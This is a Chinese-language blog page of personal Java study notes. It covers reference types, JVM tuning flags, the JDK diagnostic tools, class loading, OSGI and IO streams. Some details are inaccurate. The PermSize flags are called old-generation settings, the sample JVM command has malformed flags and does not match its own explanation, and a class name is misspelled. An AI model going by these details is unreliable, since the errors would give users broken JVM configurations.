<h2 id="Java引用类型和垃圾回收的关系"><a href="#Java引用类型和垃圾回收的关系" class="headerlink" title="Java引用类型和垃圾回收的关系"></a>Java引用类型和垃圾回收的关系</h2><p>在Java中，引用类型可以分为四种：强引用、软引用、弱引用和虚引用。它们主要在对象的生命周期和垃圾回收方面有所区别。</p>
<ol>
<li>强引用（Strong Reference）：<br>当一个对象被强引用指向时，它不会被垃圾回收器回收。只有当强引用不再指向该对象时，该对象才有可能被回收。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>软引用（Soft Reference）：<br>当一个对象只被软引用指向时，它在内存不足时会被垃圾回收器回收。软引用主要用于实现缓存功能。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.SoftReference;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">// obj 是一个强引用</span></span><br><span class="line">SoftReference&lt;Object&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;&gt;(obj); <span class="comment">// softReference 是一个软引用</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>弱引用（Weak Reference）：<br>  当一个对象只被弱引用指向时，可以被垃圾回收器回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构，如ThreadLocal的实现就使用了弱引用。若是强引用，即使tl&#x3D;null ，但key的引用依然指向ThreadLocal对象，所以会有内存泄漏，而使用弱引用则不会。具体来说，<code>ThreadLocal</code>由一个名为<code>ThreadLocal.ThreadLocalMap</code>的内部类来保存。在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。这意味着，如果<code>ThreadLocal</code>对象没有其他强引用存在，那么这个<code>ThreadLocal</code>对象就可能在下一次垃圾回收时被回收。但还是有内存泄漏存在，ThreadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏，所以还是需要remve()这个key。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.WeakReference;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(obj);</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>虚引用（Phantom Reference）：<br>当一个对象只被虚引用指向时，它只是用于跟踪对象是否被回收，可以被垃圾回收器回收。主要用于管理堆外内存，通常和ReferenceQueue结合使用，当DirectByteBuffer对象被回收时，就向ReferenceQueue对象中添加数据，垃圾回收器可以通过检测ReferenceQueue对象得到到这一变化，然后清理堆外内存。和弱引用的区别是弱引用中的对象可以被弱引用变量get到，但是虚引用引用的变量不能被get到。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.PhantomReference;</span><br><span class="line"><span class="keyword">import</span> java.lang.ref.ReferenceQueue;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">ReferenceQueue&lt;Object&gt; referenceQueue = <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>&lt;&gt;();</span><br><span class="line">PhantomReference&lt;Object&gt; phantomReference = <span class="keyword">new</span> <span class="title class_">PhantomReference</span>&lt;&gt;(obj, referenceQueue);</span><br></pre></td></tr></table></figure>

<h1 id="JVM的参数配置"><a href="#JVM的参数配置" class="headerlink" title="JVM的参数配置"></a>JVM的参数配置</h1><h2 id="JVM的参数"><a href="#JVM的参数" class="headerlink" title="JVM的参数"></a>JVM的参数</h2><table>
<thead>
<tr>
<th>参数名</th>
<th>描述</th>
<th>使用示例</th>
</tr>
</thead>
<tbody><tr>
<td>-Xmx</td>
<td>设置JVM最大可用内存</td>
<td><code>java -Xmx2g MyApp</code> 将最大可用内存设置为2GB</td>
</tr>
<tr>
<td>-Xms</td>
<td>设置JVM最小可用内存</td>
<td><code>java -Xms512m MyApp</code> 将最小可用内存设置为512MB</td>
</tr>
<tr>
<td>-XX:MaxDirectMemorySize</td>
<td>设置JVM可以使用的最大堆外内存大小，其默认值等于JVM的最大堆大小（即<code>-Xmx</code>的值）</td>
<td><code>java -XX:MaxDirectMemorySize=1g -jar MyApp</code>设置JVM的最大堆外内存大小为1GB</td>
</tr>
<tr>
<td>-Xmn</td>
<td>指定了 JVM 中新生代的最大可用空间，它的默认值是整个堆空间的1&#x2F;4，即 <code>-Xmx</code> 的1&#x2F;4。当新生代的大小达到了 <code>-Xmn</code> 指定的大小后，如果新生代中仍然有存活的对象，它们将被晋升到老年代。</td>
<td><code>java -Xmn256m MyApp</code> 将新生代大小设置为256MB，</td>
</tr>
<tr>
<td>-XX:NewSize</td>
<td>设置新生代初始大小</td>
<td><code>java -XX:NewSize=256m Main</code>将新生代的大小设置为256MB</td>
</tr>
<tr>
<td>-XX:PermSize</td>
<td>设置老年代初始大小</td>
<td><code>java -XX:PermSize=128m MyApp</code> 将永久代初始大小设置为128MB</td>
</tr>
<tr>
<td>-XX:MaxPermSize</td>
<td>设置老年代最大大小</td>
<td><code>java -XX:MaxPermSize=256m MyApp</code> 将永久代最大大小设置为256MB</td>
</tr>
<tr>
<td>-XX:NewRatio</td>
<td>设置新生代和老年代的比例</td>
<td><code>java -XX:NewRatio=2 MyApp</code> 将新生代和老年代的比例设置为1:2</td>
</tr>
<tr>
<td>-XX:SurvivorRatio</td>
<td>设置新生代中eden区和survivor区的比例</td>
<td><code>java -XX:SurvivorRatio=8 MyApp</code> 将eden区和survivor区的比例设置为8:1</td>
</tr>
<tr>
<td>-XX:MetaspaceSize</td>
<td>设置元空间大小</td>
<td><code>java -XX:MetaspaceSize=256m MyApp</code> 将元空间大小设置为256MB</td>
</tr>
<tr>
<td>-XX:+UseG1GC</td>
<td>启用G1垃圾回收器</td>
<td><code>java -XX:+UseG1GC MyApp</code> 启用G1垃圾回收器</td>
</tr>
<tr>
<td>-XX:+UseConcMarkSweepGC</td>
<td>启用CMS垃圾回收器</td>
<td><code>java -XX:+UseConcMarkSweepGC MyApp</code> 启用CMS垃圾回收器</td>
</tr>
<tr>
<td>-XX:+HeapDumpOnOutOfMemoryError</td>
<td>当发生OOM异常时，自动生成堆转储文件（heap dump），以便在之后进行分析</td>
<td><code>java -XX:+HeapDumpOnOutOfMemoryError</code>当发生OOM异常时打印日志</td>
</tr>
<tr>
<td>-XX:HeapDumpPath&#x3D;path</td>
<td>指定生成堆转储文件的路径</td>
<td><code>-XX:HeapDumpPath=path=dump.log</code>指定OOM日志存储信息</td>
</tr>
<tr>
<td>-XX:+PrintGC</td>
<td>输出GC（垃圾回收）日志</td>
<td><code>-XX:+PrintGC</code></td>
</tr>
<tr>
<td>-XX:+PrintGCDetails</td>
<td>输出GC详细信息</td>
<td><code>-XX:+PrintGCDetails</code></td>
</tr>
<tr>
<td>-XX:+PrintHeapAtGC</td>
<td>在每次GC后打印堆的详细信息</td>
<td><code>-XX:+PrintHeapAtGC</code></td>
</tr>
</tbody></table>
<h2 id="JVM参数设置示例"><a href="#JVM参数设置示例" class="headerlink" title="JVM参数设置示例"></a>JVM参数设置示例</h2><p>8G内存服务器上运行了start.jar和Netty，JVM参数设置示例如下</p>
<p>其中2GB留给操作系统，其余6GB分配给应用程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java -server #JVM运行在服务器模式下</span><br><span class="line">-XX:MaxDirectMemorySize #直接内存大小为2GB（Netty服务在运行时会使用直接内存，需要保证既有足够的直接内存满足Netty服务高效运行，又要在和虚拟机内存大小直接取得平衡）</span><br><span class="line">-Xmx3g -Xms3g #Java堆的大小为3GB</span><br><span class="line">--XX:NewSize #新生代占用堆1GB</span><br><span class="line">-XX:MetaspaceSize=128m #元空间的大小为128MB</span><br><span class="line">-XX:+UseG1GC #启用G1垃圾回收器</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError #发生OOM时打印日志</span><br><span class="line">-XX:HeapDumpPath=path=dump.log #指定OOM日志存储信息</span><br><span class="line">-XX:+PrintGCDetails #输出GC详细信息</span><br><span class="line">-XX:+PrintHeapAtGC #每次GC后打印堆的详细信息</span><br></pre></td></tr></table></figure>

<p>参数的含义如下：</p>
<ul>
<li><code>-server</code>：JVM运行在服务器模式下，以优化长时间运行的性能。</li>
<li><code>-Xmx6g</code>：设置JVM的最大堆大小为6GB。这个值可以根据应用程序的需要进行调整。</li>
<li><code>-Xms6g</code>：设置JVM的初始堆大小为6GB。这个值应该与 <code>-Xmx</code> 相同，以避免堆大小的动态调整。</li>
<li><code>-Xmn3g</code>：设置JVM的新生代大小为3GB，这个值可以根据应用程序的内存需求和垃圾收集策略来进行调整。</li>
<li><code>-XX:MetaspaceSize=512m</code>：设置JVM的元数据空间的初始大小为512MB。</li>
<li><code>-XX:MaxMetaspaceSize=512m</code>：设置JVM的元数据空间的最大大小为512MB，这个值可以根据应用程序的需要进行调整。</li>
<li><code>-XX:+UseG1GC</code>：使用 G1 垃圾收集器。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器，它以可预测的停顿时间和高效的内存回收著称。</li>
</ul>
<p>这些参数的设置应该根据具体的应用程序和系统配置进行调整，以获得最佳性能和稳定性。另外，可以使用一些诊断工具，如 jstat 和 jmap 等来监测 JVM 的运行状态和内存使用情况，以帮助优化 JVM 的性能和稳定性</p>
<h2 id="JVM性能分析工具（调优工具）"><a href="#JVM性能分析工具（调优工具）" class="headerlink" title="JVM性能分析工具（调优工具）"></a>JVM性能分析工具（调优工具）</h2><p>常用的工具有jps、jinfo、jstat、jstack、jmap等，这些工具包含在JDK（Java Development Kit）的<code>bin</code>目录中，因此需要安装JDK才能使用</p>
<h3 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h3><p>用于查看正在运行的Java进程及其相关信息（进程id、虚拟机参数如端口号和可用内存大小、jar包名称）</p>
<p><code>jps</code>的基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jps [options] [hostid]</span><br></pre></td></tr></table></figure>

<p><code>options</code>表示可选的参数，<code>hostid</code>表示远程主机的ID，如果不指定则默认为本地主机。以下是一些常用的<code>jps</code>选项：</p>
<ul>
<li><code>-l</code>：显示完整的包名和主类名。</li>
<li><code>-m</code>：显示传递给Java进程的参数。</li>
<li><code>-v</code>：显示传递给JVM的参数。</li>
<li><code>-q</code>：仅显示Java进程的ID，不显示类名、JAR名称和传递给Java进程的参数。</li>
</ul>
<h3 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h3><p><code>jinfo</code>（Java Configuration Info Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的配置信息，如系统属性和JVM参数</p>
<p><code>jinfo</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinfo [option] pid</span><br></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示可选的参数，如获取系统属性、JVM参数等。</li>
<li><code>pid</code>：表示要获取配置信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jinfo</code>选项：</p>
<ul>
<li><code>-flag</code>：显示或修改指定的JVM参数。</li>
<li><code>-sysprops</code>：显示Java系统属性。</li>
<li><code>-flags</code>：显示JVM参数。</li>
</ul>
<p>举个例子，要获取一个Java进程（假设其进程ID为12345）的Java系统属性，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinfo -sysprops 12345</span><br></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有Java系统属性，如<code>java.version</code>、<code>java.vendor</code>、<code>java.home</code>等。您可以根据这些信息了解Java进程的运行环境和配置。</p>
<p>另一个例子，要查看一个Java进程（假设其进程ID为12345）的JVM参数，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinfo -flags 12345</span><br></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有JVM参数，如<code>-Xmx</code>、<code>-Xms</code>、<code>-XX:+UseParallelGC</code>等。您可以根据这些信息了解和优化Java进程的JVM配置。</p>
<h3 id="jstat"><a href="#jstat" class="headerlink" title="jstat"></a>jstat</h3><p>用于监控JVM内存使用情况和垃圾回收情况</p>
<p><code>jstat</code>的基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstat [option] [vmid] [interval] [count]</span><br></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示要收集的统计信息类型，如垃圾回收、类加载等。</li>
<li><code>vmid</code>：表示要监控的Java虚拟机进程的ID。</li>
<li><code>interval</code>：表示数据收集的时间间隔（以毫秒为单位），可选参数。</li>
<li><code>count</code>：表示要收集的数据点数目，可选参数。</li>
</ul>
<p>以下是一些常用的<code>jstat</code>选项：</p>
<ul>
<li><code>-class</code>：显示关于类加载器的统计信息。</li>
<li><code>-compiler</code>：显示关于即时编译的统计信息。</li>
<li><code>-gc</code>：显示关于垃圾回收的统计信息。</li>
<li><code>-gccapacity</code>：显示关于垃圾回收的各个内存区域的容量。</li>
<li><code>-gcutil</code>：显示关于垃圾回收的各个内存区域的使用情况。</li>
<li><code>-gcnew</code>：显示关于新生代垃圾回收的统计信息。</li>
<li><code>-gcold</code>：显示关于老年代垃圾回收的统计信息。</li>
</ul>
<p>举个例子，要收集一个Java进程（假设其进程ID为12345）的垃圾回收统计信息，每隔1000毫秒收集一次，总共收集10次，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstat -gc 12345 1000 10</span><br></pre></td></tr></table></figure>

<p>这个命令会输出一系列关于垃圾回收的统计信息，如内存区域的大小、已使用空间、垃圾回收次数等。</p>
<h3 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h3><p>用于生成虚拟机当前时刻的线程快照，目的通常是定位线程出现长时间停顿的原因。对于诊断Java应用程序的线程问题、锁竞争和死锁等问题非常有用。</p>
<p><code>jstack</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstack [option] pid</span><br></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示可选的参数，如打印锁信息等。</li>
<li><code>pid</code>：表示要获取堆栈跟踪信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jstack</code>选项：</p>
<ul>
<li><code>-l</code>：显示关于锁的附加信息，如已拥有的锁、等待的锁等。</li>
<li><code>-m</code>：显示关于本地方法的堆栈跟踪信息（仅适用于部分平台）。</li>
<li><code>-F</code>：强制执行堆栈跟踪，当正常执行失败时使用（仅适用于部分平台）。</li>
</ul>
<p>举个例子，要获取一个Java进程（假设其进程ID为12345）的线程堆栈跟踪信息，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstack 12345</span><br></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有线程的堆栈跟踪信息，包括线程ID、线程状态、调用栈等。您可以根据这些信息诊断和解决应用程序中的线程问题。</p>
<h3 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h3><p><code>jmap</code>（Java Memory Map Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的内存映射信息。它可以帮助您分析Java堆（heap）、永久代（PermGen，仅JDK 7及更早版本）或元空间（Metaspace，JDK 8及更高版本）的使用情况，从而诊断和解决内存泄漏、内存溢出等问题</p>
<p><code>jmap</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmap [option] pid</span><br></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示要执行的操作，如获取堆信息、生成堆转储文件等。</li>
<li><code>pid</code>：表示要获取内存映射信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jmap</code>选项：</p>
<ul>
<li><code>-dump</code>：生成堆转储文件（heap dump），可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析。</li>
<li><code>-histo</code>：显示堆中对象的实例数量、内存占用和类名等信息的直方图。</li>
<li><code>-heap</code>：显示堆的摘要信息，如使用的垃圾回收器、内存区域的大小和使用情况等。</li>
<li><code>-permstat</code>：显示永久代（PermGen）的类加载器、内存占用和类名等信息的统计信息（仅适用于JDK 7及更早版本）。</li>
<li><code>-clstats</code>：显示类加载器和系统类的统计信息。</li>
<li><code>-finalizerinfo</code>：显示在队列中等待执行的终结器方法的对象的信息。</li>
</ul>
<p>举个例子，要为一个Java进程（假设其进程ID为12345）生成堆转储文件，并将其保存到当前目录下的<code>heapdump.hprof</code>文件中，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmap -dump:format=b,file=heapdump.hprof 12345</span><br></pre></td></tr></table></figure>

<p>这个命令会生成一个堆转储文件，其中包含了Java进程的内存使用情况。您可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析，以诊断和解决内存相关问题。</p>
<h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><h2 id="类加载阶段"><a href="#类加载阶段" class="headerlink" title="类加载阶段"></a>类加载阶段</h2><p>Java虚拟机（JVM）的类加载机制是Java程序运行时将.class文件加载到内存的过程。类加载主要分为五个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）和初始化（Initialization）。</p>
<ol>
<li><p>加载（Loading）: 在这个阶段，JVM将从文件系统或网络中查找指定的.class文件，然后将其二进制数据加载到内存中，创建一个Class对象来表示这个类。类加载器主要有三个：引导类加载器（Bootstrap ClassLoader）、扩展类加载器（Extension ClassLoader）和应用类加载器（Application ClassLoader）。</p>
</li>
<li><p>验证（Verification）: JVM会对已加载的二进制数据进行校验，确保其符合Java语言规范和JVM规范。这个过程包括：文件格式验证、元数据验证、字节码验证和符号引用验证。验证阶段的目的是确保加载的类文件不会对JVM产生不良影响。</p>
</li>
<li><p>准备（Preparation）: 在这个阶段，JVM会为类的静态变量分配内存，并赋予默认值。注意这里的默认值不是程序员在代码中指定的初始值，而是基本类型的零值或引用类型的null值。</p>
<p>而对于final类型的静态变量，如果它们在编译时可以确定值（即编译时常量），JVM会在准备阶段直接为它们分配内存并赋予程序员在代码中指定的初始值。这是因为final变量的值在程序运行期间是不可变的，所以可以提前赋值。然而，如果一个final类型的静态变量不能在编译时确定值（例如，它的值是通过方法调用得到的），那么这个变量在准备阶段仍然会被赋予默认值，然后在初始化阶段由程序员指定的值替换。</p>
</li>
<li><p>解析（Resolution）: 解析阶段主要是将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。</p>
<p>在Java程序中，类、接口、字段和方法等元素在源代码中的表示形式通常是符号引用（Symbolic Reference）。符号引用是一种依赖于符号（如类名、方法名和字段名等）的引用形式。然而，为了在运行时更高效地访问这些元素，JVM需要将这些符号引用替换为直接引用（Direct Reference）。</p>
<p>直接引用是一种可以直接指向内存地址或者间接指向内存地址的引用。在JVM中，直接引用可以是指向方法区（Method Area）中类和接口数据结构的指针、指向实例变量和类变量的内存地址的偏移量，或者是指向常量池中某个常量的索引。</p>
<p>符号引用和直接引用的区别在于，符号引用需要在运行时通过查找和解析得到实际的内存地址，而直接引用已经包含了实际的内存地址信息，可以直接访问目标元素。因此，使用直接引用可以提高程序运行时的访问速度。</p>
<p>在类加载的解析阶段，JVM负责将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。需要注意的是，并非所有的符号引用都会在解析阶段被替换为直接引用，有些符号引用会在程序运行时进行动态解析。这通常发生在反射和动态代理等场景下。</p>
</li>
<li><p>初始化（Initialization）: 在这个阶段，JVM会根据程序员在代码中指定的初始值，为类的静态变量赋予正确的值。此外，如果类有静态代码块，JVM会执行这些代码块。初始化阶段是类加载过程中的最后一个阶段。</p>
</li>
</ol>
<h2 id="父子类加载和初始化顺序关系"><a href="#父子类加载和初始化顺序关系" class="headerlink" title="父子类加载和初始化顺序关系"></a>父子类加载和初始化顺序关系</h2><p>在JVM类加载阶段，父子类关系表现在加载和初始化过程。加载子类时，所有父类被加载。初始化时，父类先于子类初始化，确保子类使用父类静态字段和方法时，父类已初始化。</p>
<h2 id="类加载器和双亲委派模型"><a href="#类加载器和双亲委派模型" class="headerlink" title="类加载器和双亲委派模型"></a>类加载器和双亲委派模型</h2><p>JVM类加载器（Class Loader）负责将.class文件加载到内存，主要有四种：</p>
<ol>
<li>引导类加载器（Bootstrap ClassLoader）：负责加载位于%Java_HOME%&#x2F;lib下的Java核心类库，如java.util等</li>
<li>扩展类加载器（Extension ClassLoader）：负责加载位于%Java_HOME%&#x2F;jre&#x2F;lib&#x2F;ext目录下Java扩展库，或通过java.ext.dirs系统变量加载指定路径下的类库</li>
<li>应用类加载器（Application ClassLoader）：负责加载用户程序的类路径（classpath）下的类</li>
<li>自定义类加载器（User ClassLoader）：通过继承java.lang.ClassLoader类并重写 findClass 方法实现</li>
</ol>
<p>类加载器采用双亲委派模型（Parent-Delegation Model）。当加载类时，先请求父加载器加载；父加载器无法加载时，当前加载器尝试加载。这保证了Java核心类库安全与一致性，避免应用程序覆盖核心类库。</p>
<h2 id="OSGI"><a href="#OSGI" class="headerlink" title="OSGI"></a>OSGI</h2><p>OSGI（Open Service Gateway Initiative）是一个用于实现模块化和动态组件系统的开放标准框架。它允许在一个Java虚拟机（JVM）实例中创建和管理多个模块化组件，这些组件被称为“bundles”。OSGI提供了一种将Java应用程序分解为更小、更易于管理和维护的模块的方法，从而提高了开发人员的生产力和代码的可重用性。</p>
<p>OSGI的主要特点如下：</p>
<ol>
<li><p>模块化：OSGI框架支持将Java应用程序划分为多个模块，每个模块都可以独立开发、部署和更新，从而降低了开发复杂性和维护成本。</p>
</li>
<li><p>动态：OSGI支持动态加载、卸载和更新模块，这意味着在不重启整个应用程序的情况下，可以热部署模块，提高了系统的灵活性和可扩展性。</p>
</li>
<li><p>服务注册和发现：OSGI提供了一个服务注册表，允许模块之间通过服务接口进行通信，而不是直接依赖于其他模块的具体实现。这有助于降低模块间的耦合度，提高代码的可维护性和可重用性。</p>
</li>
<li><p>版本管理：OSGI允许同一个JVM中存在不同版本的模块，这样可以在升级或修复某个模块时避免对其他模块产生影响。</p>
</li>
</ol>
<p>OSGI已被广泛应用于各种Java项目中，例如Eclipse IDE（集成开发环境）就是基于OSGI构建的</p>
<p>OSGI不遵循双亲委派模型，在安全上有所牺牲</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/02/Java%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/02/Java%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">Java基础</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-02 21:23:04" itemprop="dateCreated datePublished" datetime="2023-05-02T21:23:04+08:00">2023-05-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-07 21:35:48" itemprop="dateModified" datetime="2023-05-07T21:35:48+08:00">2023-05-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h1><h2 id="字节流和字符流"><a href="#字节流和字符流" class="headerlink" title="字节流和字符流"></a>字节流和字符流</h2><blockquote>
<p>根据数据流向的方向不同，分为输入流和输出流</p>
</blockquote>
<p>IO流的输入\出源有控制台、文件、网络、数据库…</p>
<p>常用的IO流：分字节流（以字节，8bit为单位对数据进行读写操作）和字符流（以字符为单位，一个字符占2个字节）</p>
<p>输入字节流包含：文件（File）、对象（Object）、字节数组（ByteArray）、管道（Pipe）、过滤器（Filter）、缓冲字符串、顺序输入流（InputStream），都是InputStream（抽象类）的子类</p>
<p>输出字节流包含：文件（File）、对象（Object）、字节数组（ByteArray）、管道（Pipe）、过滤器（Filter）输出流（OutputStream），都是OutputStream（抽象类）的子类</p>
<p>输入字符流包含：字符数组（CharArray）、字符串（String）、其他输入流的缓冲区（Buffered）、管道（Piped）、过滤器（Filter）、将字节输入流转换为字符输入流（InputStream）Reader，都是Reader的子类（Reader是所有字符输入流的父类）</p>
<p>输出字符流包含：字符数组（CharArray）、字符串（String）、其他输出流的缓冲区（Buffered）、管道（Piped）、过滤器（Filter）、将字节输入流转换为字符输入流（InputStream）Writer，都是Writer的子类（Writer是所有字符输出流的父类）</p>
<h2 id="节点流和处理流"><a href="#节点流和处理流" class="headerlink" title="节点流和处理流"></a>节点流和处理流</h2><p>节点流是低级流，直接与数据源相连，并且进行读写；处理流是高级流，不直接和数据源相连（采用装饰器模式对节点流进行封装），主要用于消除不同节点实现上的差异。</p>
<p>节点流包含：FileInputStream、FileOutputStream、FileReader、FileWriter</p>
<p>处理流包含：BufferInputStream（<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/api/java/io/FilterInputStream.html">FilterInputStream</a>的实现类）、BufferOutputStream、BufferReader、BufferWriter</p>
<p>处理流相比节点流的优点：通过增加缓存提高了数据输入和输出的效率、封装了一系列高级方法来完成一次性大批量数据的输入和输出</p>
<h2 id="内存映射文件技术"><a href="#内存映射文件技术" class="headerlink" title="内存映射文件技术"></a>内存映射文件技术</h2><p>含义：操作系统利用虚拟内存将文件映射到内存中，然后，这个文件就可以被当作内存数据来访问</p>
<p>关键技术优势：</p>
<ul>
<li>让操作系统负责文件的读写，应用程序只需要处理内存数据，就可以实现IO操作；</li>
<li>可以实现共享内存，内存映射文件可以被多个进程同时访问；内存映射文件技术涉及的内存在Java的堆空间之外；</li>
<li>大幅提升文件数据的输入输出速度</li>
</ul>
<p>Java的NIO包支持内存映射技术，实现方式是通过<strong>MapperdBytyBuffer</strong>读写内存</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">SBR</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
